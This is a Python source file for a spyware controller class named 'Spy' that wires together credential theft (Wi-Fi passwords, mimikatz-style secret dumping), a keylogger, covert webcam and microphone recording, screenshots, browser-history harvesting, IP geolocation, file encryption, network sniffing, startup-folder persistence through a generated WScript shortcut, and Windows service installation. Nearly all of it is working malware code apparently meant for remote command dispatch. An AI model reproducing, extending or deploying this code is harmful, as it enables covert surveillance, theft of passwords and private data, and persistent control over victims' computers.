import os
import subprocess
import tempfile
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List
from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME, NSSM_PATH, PROTECTED_FILES, PROTECTED_DIRS, \
    SERVICE_PATHS, SERVICE_NAME, OVIL_PATH, START_UP_FOLDER, ROOT_DIRECTORY
from spying.KeyLogger import KeyLogger
from spying.Wifi import steal_passwords
import spying.admin
from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
from pyautogui import screenshot
import geocoder
from spying.encrypt import Encryptor
from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
from spying.pc_passwords import get_secrets
from spying.browser import get_browser_info, list_of_history_to_str
from service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
    install_service, remove_services


class Spy:
    def __init__(self):
        #if not admin.make_admin():
        #    exit()
        self.keyLogger: Optional[KeyLogger] = None
        self.video_recorder: Optional[VideoRecorder] = None
        self.audio_recorder: Optional[AudioRecorder] = None
        self.encryptor: Optional[Encryptor] = None
        self.ok_commands = {
            "steal_passwords": self.steal_passwords,
            "start_keylogger": self.start_keylogger,
            "stop_keylogger": self.stop_keylogger,
            "start_video_audio_record": self.start_video_audio_record,
            "start_video_record": self.start_video_record,
            "start_audio_record": self.start_audio_record,
            "stop_video_audio_record": self.stop_video_audio_record,
            "stop_video_record": self.stop_video_record,
            "stop_audio_record": self.stop_audio_record
        }

    @staticmethod
    def steal_passwords() -> str:
        return steal_passwords()

    @staticmethod
    def passwords_by_mimikatz() -> str:
        return get_secrets()

    def start_keylogger(self) -> bool:
        if self.keyLogger:
            return False
        self.keyLogger = KeyLogger()
        return self.keyLogger.start()

    def stop_keylogger(self) -> bool:
        if not self.keyLogger:
            return False
        r = self.keyLogger.stop()
        self.keyLogger = None
        return r

    def get_keyLogger(self) -> str:
        if self.keyLogger:
            return ", ".join(list(self.keyLogger.keys.queue))

    def is_keyLogger_runs(self):
        return self.keyLogger is not None

    def start_video_audio_record(self, camindex=None) -> bool:
        if self.audio_recorder or self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(camindex=camindex)
        self.audio_recorder = AudioRecorder()
        self.video_recorder.start()
        self.audio_recorder.start()
        return True

    def start_video_record(self, filename=None, camindex=None) -> bool:
        if self.video_recorder:
            return False
        self.video_recorder = VideoRecorder(filename, camindex=camindex) if filename else VideoRecorder(camindex=camindex)
        self.video_recorder.start()
        return True

    def start_audio_record(self, filename=None) -> bool:
        if self.audio_recorder:
            return False
        self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
        self.audio_recorder.start()
        return True

    def stop_video_audio_record(self, filename=DEFAULT_VIDEO_AUDIO_NAME) -> bool:
        if (not self.audio_recorder) or (not self.audio_recorder):
            return False
        self.video_recorder.stop_merge(self.audio_recorder, filename)
        self.audio_recorder = None
        self.video_recorder = None
        return True

    def stop_video_record(self) -> bool:
        if not self.video_recorder:
            return False
        r = self.video_recorder.stop()
        self.video_recorder = None
        return r

    def stop_audio_record(self) -> bool:
        if not self.audio_recorder:
            return False
        r = self.audio_recorder.stop()
        self.audio_recorder = None
        return r

    def is_video_audio_started(self):
        return self.is_audio_started() and self.is_video_started()

    def is_video_started(self):
        return self.video_recorder is not None

    def is_audio_started(self):
        return self.audio_recorder is not None


    def generate_key(self):
        self.encryptor = Encryptor()
        return self.encryptor.encryption_key.decode()

    # @property
    def encryption_key(self) -> str:
        if self.encryptor:
            return self.encryptor.encryption_key.decode()
        return self.generate_key()

    def encrypt(self, path: str, key=None) -> Tuple[list, list]:
        if not key:
            return self.encryptor.encrypt(path)
        self.encryptor = Encryptor(key)
        return self.encryptor.encrypt(path)

    def decrypt(self, path: str, key=None) -> Tuple[list, list]:
        if not key:
            return self.encryptor.decrypt(path)
        e = Encryptor(key)
        return e.decrypt(path)

    @staticmethod
    def show_files(path: str) -> str:
        return ",".join([file for file in os.listdir(path)])

    @staticmethod
    def start_sniffing_to_file(path: str, ip: str, port: int) -> bool:
        if is_MITM_runs():
            return False
        t = threading.Thread(target=filestart, args=(path, (ip, port)))
        t.start()
        return is_MITM_runs()

    @staticmethod
    def start_sniffing_on_net(ip: str, port: int):
        if is_MITM_runs():
            return False
        t = threading.Thread(target=netstart, args=((ip, port), ))
        t.start()
        return is_MITM_runs()

    @staticmethod
    def stop_sniffing():
        return stop_sniffing()

    @staticmethod
    def get_available_cameras() -> str:
        return get_available_cameras()

    @staticmethod
    def get_user() -> str:
        return os.getlogin()

    @staticmethod
    def get_computer() -> str:
        return os.environ['COMPUTERNAME']

    @staticmethod
    def take_screenshot(path: str = DEFAULT_SCREENSHOT_NAME) -> bool:
        """ taking a screenshot and save it in the given path.
        :param path: where to save the file
        :return: whether succeeded
        """
        if not path.endswith(".jpg"):
            path += ".jpg"
        try:
            image = screenshot()
            image.save(path)
            image.close()
            # print("A screenshot has been taken")
        except OSError:
            # print(f"Couldn't take screenshot because {e}")
            return False
        return True

    @staticmethod
    def get_browser_info() -> List[Tuple[datetime, str]]:
        return get_browser_info()

    @classmethod
    def get_browser_info_str(cls) -> str:
        return list_of_history_to_str(cls.get_browser_info())


    @staticmethod
    def get_location():
        return geocoder.ip('me').json

    @staticmethod
    def enter_to_startup(path: str = OVIL_PATH) -> bool:
        create_shortcut(str(Path(START_UP_FOLDER) / (Path(path).name + ".lnk")), path, working_dir=ROOT_DIRECTORY)
        return True


    @staticmethod
    def secure_files(protected_files: List[Tuple[str, str]] = PROTECTED_FILES,
                     protected_dirs: List[Tuple[str, str]] = PROTECTED_DIRS) -> None:
        return secure_files(protected_files, protected_dirs)

    @staticmethod
    def check_status(service_name: str, nssm_path: str = NSSM_PATH) -> Tuple[str, str]:
        return check_status(service_name, nssm_path)

    @staticmethod
    def is_started(service_name: str, nssm_path: str = NSSM_PATH) -> bool:
        return is_started(service_name, nssm_path)


    @staticmethod
    def is_installed(service_name: str, nssm_path: str = NSSM_PATH) -> bool:
        return is_installed(service_name, nssm_path)

    @staticmethod
    def start_service(service_name: str, nssm_path: str = NSSM_PATH) -> Tuple[str, str]:
        return start_service(service_name,nssm_path)

    @staticmethod
    def remove_service(service_name: str, nssm_path: str = NSSM_PATH) -> tuple[tuple[str, str], Tuple[str, str]]:
        return remove_service(service_name, nssm_path)

    @staticmethod
    def install_service(service_name: str = SERVICE_NAME+"1", service_path: str = SERVICE_PATHS[0][0],
                        nssm_path: str = NSSM_PATH, start: bool = True,
                        override: bool = False, directory_path=None) -> str:
        return install_service(service_name, service_path, nssm_path, start, override, directory_path)

    @staticmethod
    def remove_services(services: List[str], nssm_path: str) -> None:
        return remove_services(services, nssm_path)


def create_shortcut(shortcut_path, target, arguments='', working_dir=''):
    shortcut_path = Path(shortcut_path)
    shortcut_path.parent.mkdir(parents=True, exist_ok=True)

    def escape_path(path):
        return str(path).replace('\\', '/')

    def escape_str(str_):
        return str(str_).replace('\\', '\\\\').replace('"', '\\"')

    shortcut_path = escape_path(shortcut_path)
    target = escape_path(target)
    working_dir = escape_path(working_dir)
    arguments = escape_str(arguments)

    js_content = f'''
        var sh = WScript.CreateObject("WScript.Shell");
        var shortcut = sh.CreateShortcut("{shortcut_path}");
        shortcut.TargetPath = "{target}";
        shortcut.Arguments = "{arguments}";
        shortcut.WorkingDirectory = "{working_dir}";
        shortcut.Save();'''

    fd, path = tempfile.mkstemp('.js')
    try:
        with os.fdopen(fd, 'w') as f:
            f.write(js_content)
        subprocess.run([R'wscript.exe', path])
    finally:
        os.unlink(path)


if __name__ == "__main__":
    Spy.enter_to_startup(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")